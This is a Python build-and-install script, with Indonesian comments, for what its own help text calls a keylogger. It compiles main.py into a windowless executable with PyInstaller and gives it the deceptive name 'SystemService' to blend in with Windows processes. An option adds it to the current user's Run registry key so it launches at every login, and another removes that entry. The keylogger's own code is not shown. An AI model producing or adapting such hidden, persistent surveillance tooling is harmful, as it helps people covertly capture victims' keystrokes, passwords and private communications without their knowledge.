"""
install.py
==========
Helper script untuk:
  1. Compile main.py menjadi .exe tanpa console window (PyInstaller)
  2. (Opsional) Daftarkan .exe ke Windows startup via Registry

Usage:
    python install.py                # hanya compile
    python install.py --startup      # compile + daftarkan ke startup
    python install.py --uninstall    # hapus dari startup (tidak hapus .exe)
"""

import argparse
import os
import subprocess
import sys
from pathlib import Path

# ---------------------------------------------------------------------------
APP_NAME    = "SystemService"          # Nama yang muncul di Registry / Task Manager
ENTRY_POINT = "main.py"
DIST_DIR    = Path(__file__).parent / "dist"
EXE_PATH    = DIST_DIR / f"{APP_NAME}.exe"
# ---------------------------------------------------------------------------


def compile_exe() -> Path:
    """Compile main.py menjadi .exe tanpa console window menggunakan PyInstaller."""
    print("[*] Compiling to .exe ...")

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",                   # satu file .exe
        "--noconsole",                 # tidak ada jendela console
        "--name", APP_NAME,            # nama output .exe
        "--distpath", str(DIST_DIR),
        "--workpath", str(Path(__file__).parent / "build"),
        "--specpath", str(Path(__file__).parent / "build"),
        "--noconfirm",                 # overwrite tanpa tanya
        ENTRY_POINT,
    ]

    result = subprocess.run(cmd, cwd=Path(__file__).parent)
    if result.returncode != 0:
        print("[!] PyInstaller gagal. Pastikan semua dependency sudah terinstall.")
        sys.exit(1)

    print(f"[+] Compile selesai: {EXE_PATH}")
    return EXE_PATH


def register_startup(exe_path: Path) -> None:
    """Daftarkan .exe ke HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."""
    if sys.platform != "win32":
        print("[!] --startup hanya didukung di Windows.")
        return

    import winreg

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, str(exe_path))
        winreg.CloseKey(key)
        print(f"[+] Didaftarkan ke startup: {APP_NAME} -> {exe_path}")
    except Exception as exc:
        print(f"[!] Gagal mendaftarkan ke startup: {exc}")


def unregister_startup() -> None:
    """Hapus entri startup dari Registry."""
    if sys.platform != "win32":
        print("[!] --uninstall hanya didukung di Windows.")
        return

    import winreg

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
        print(f"[+] Dihapus dari startup: {APP_NAME}")
    except FileNotFoundError:
        print(f"[!] Entri '{APP_NAME}' tidak ditemukan di startup registry.")
    except Exception as exc:
        print(f"[!] Gagal menghapus dari startup: {exc}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Build and optionally register the keylogger as a startup program."
    )
    parser.add_argument(
        "--startup",
        action="store_true",
        help="Register the compiled .exe to run automatically on Windows login.",
    )
    parser.add_argument(
        "--uninstall",
        action="store_true",
        help="Remove the startup registry entry (does not delete the .exe).",
    )
    args = parser.parse_args()

    if args.uninstall:
        unregister_startup()
        return

    exe = compile_exe()

    if args.startup:
        register_startup(exe)


if __name__ == "__main__":
    main()
